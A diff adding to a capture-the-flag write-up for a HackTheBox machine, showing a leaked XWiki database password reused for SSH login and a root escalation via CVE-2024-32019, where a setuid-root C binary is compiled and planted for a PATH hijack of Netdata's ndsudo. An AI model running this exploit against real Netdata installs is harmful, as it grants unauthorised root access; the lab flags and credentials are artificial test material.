@@ -86,5 +86,36 @@ Database credentials were found in the XWiki configuration file.
 **Credentials:**
 ```xml
 <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+```
+### SSH Access:
+``` bash
+ssh oliver@editor.htb
+# Password: theEd1t0rTeam99
+```
+**User flag:**
+**bc2341152c638da4a05b91d91c1df26f** 
 
+## 🚀 Privilege Escalation: to Root
+### CVE-2024-32019 - Netdata ndsudo Privilege Escalation
+Abused SUID binary /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo for PATH hijacking.
 
+#### Exploitation Steps:
+
+- 1 Create malicious binary:
+
+```bash
+echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nvme-list.c
+gcc /tmp/nvme-list.c -o /tmp/nvme-list
+```
+
+- 2 Hijack PATH and execute:
+``` bash 
+export PATH=/tmp:$PATH
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+```
+
+**Result: Gained root shell access.**
+
+**Root Flag: 6d4d6c2368c3210994e624647c93119f**
+
+## Bingo! I'm a root! 
